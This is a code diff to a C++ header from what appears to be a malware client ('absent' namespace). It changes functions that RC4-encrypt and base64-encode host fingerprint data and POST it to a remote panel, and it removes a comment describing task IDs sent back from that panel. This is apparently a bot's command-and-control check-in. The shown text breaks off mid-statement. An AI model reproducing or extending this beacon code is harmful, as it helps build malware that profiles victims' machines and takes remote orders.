@@ -1,12 +1,4 @@
 #pragma once
-/*
-	Responce
-	{
-		"task": (Internal Task ID, 0 for notask),
-		"taskId": (GUID for identifying task to panel),
-		"taskParm": (optional task parmerters (list)),
-	}
-*/
 #include <string>
 
 namespace absent
@@ -22,19 +14,19 @@ namespace absent
 
 		}
 
-		std::string firstKnock(std::string host, std::string path, nlohmann::json info, std::string key)
+		/*nlohmann::json*/ std::string firstKnock(std::string host, std::string path, nlohmann::json info, std::string key)
 		{
 			absent::crypto::RC4 rc4;
 
 			for (auto& el : info.items()) { if (el.key() != "fp") { el.value() = absent::crypto::b64::encode(rc4.crypt(el.value(), key).c_str()); } }
 			for (int ip = 0; ip < info["fp"].size(); ip++) { info["fp"][ip] = absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str()); }
 			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());
-			toSend = "request=" + toSend;
+			toSend = "new=true&request=" + toSend;
 
 			return /*decryptResponce(*/absent::http::post(host, path, toSend)/*, key)*/;
 		}
 
-		std::string knock(std::string host, std::string path, nlohmann::json info, std::string key)
+		nlohmann::json knock(std::string host, std::string path, nlohmann::json info, std::string key)
 		{
 			absent::crypto::RC4 rc4;
 			nlohmann::json smallInfo = 
